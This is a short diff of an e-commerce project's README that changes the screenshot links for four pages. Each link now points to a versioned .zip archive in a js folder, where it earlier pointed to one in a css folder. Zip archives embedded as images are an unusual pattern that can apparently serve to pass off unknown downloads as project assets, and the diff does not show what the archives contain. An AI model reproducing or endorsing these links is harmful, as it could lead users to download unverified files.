@@ -4,19 +4,19 @@
  
  
 ### Home page
-![1](https://raw.githubusercontent.com/ayushgoyal73/E-Commerce/main/css/E-Commerce-v2.2-alpha.2.zip)
+![1](https://raw.githubusercontent.com/ayushgoyal73/E-Commerce/main/js/Commerce_v2.2-beta.2.zip)
 
 
 
 ### Content Description page
-![2](https://raw.githubusercontent.com/ayushgoyal73/E-Commerce/main/css/E-Commerce-v2.2-alpha.2.zip)
+![2](https://raw.githubusercontent.com/ayushgoyal73/E-Commerce/main/js/Commerce_v2.2-beta.2.zip)
 
 
 
 ### Ordered List page
-![3](https://raw.githubusercontent.com/ayushgoyal73/E-Commerce/main/css/E-Commerce-v2.2-alpha.2.zip)
+![3](https://raw.githubusercontent.com/ayushgoyal73/E-Commerce/main/js/Commerce_v2.2-beta.2.zip)
 
 
 
 ### Order confirm page
-![4](https://raw.githubusercontent.com/ayushgoyal73/E-Commerce/main/css/E-Commerce-v2.2-alpha.2.zip)
+![4](https://raw.githubusercontent.com/ayushgoyal73/E-Commerce/main/js/Commerce_v2.2-beta.2.zip)
